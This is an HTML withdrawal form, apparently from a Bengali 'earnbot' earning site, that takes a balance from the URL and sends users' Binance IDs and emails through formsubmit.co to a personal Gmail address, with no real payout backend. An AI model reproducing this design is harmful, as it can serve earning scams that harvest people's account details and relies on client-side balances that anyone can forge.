<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdraw Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1fff1;
      padding: 20px;
    }
    .container {
      max-width: 480px;
      margin: auto;
      background: white;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #006400;
    }
    label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
    }
    input, textarea {
      width: 100%;
      padding: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      margin-top: 5px;
    }
    button {
      width: 100%;
      background: #28a745;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background: #218838;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Withdraw Request</h2>
    <p>বর্তমান ব্যালেন্স: <span id="balance">--</span> BDT</p>

    <form id="withdrawForm" action="https://formsubmit.co/idfacebook715@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_next" value="https://shohansathi69.github.io/earnbot31.github.io/thankyou.html">

      <label>Withdraw Amount (BDT)</label>
      <input type="number" id="amount" name="Amount" required>

      <label>Binance ID</label>
      <input type="text" name="Mobile Number" required>

      <label>Your Email</label>
      <input type="email" name="Email" required>

      <button type="submit">Submit Withdraw</button>
    </form>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    let balance = parseFloat(urlParams.get('balance')) || 0;
    const balanceText = document.getElementById('balance');
    balanceText.textContent = balance.toFixed(2);

    const form = document.getElementById('withdrawForm');
    form.addEventListener('submit', function(e) {
      const amount = parseFloat(document.getElementById('amount').value);
      if (amount > balance) {
        e.preventDefault();
        alert("❌ পর্যাপ্ত ব্যালেন্স নেই!");
      } else {
        const newBalance = balance - amount;
        const date = new Date().toLocaleString();
        const history = JSON.parse(localStorage.getItem('withdrawHistory')) || [];
        history.push({amount, date});
        localStorage.setItem('withdrawHistory', JSON.stringify(history));
        localStorage.setItem('newBalance', newBalance);
      }
    });
  </script>
</body>
</html>
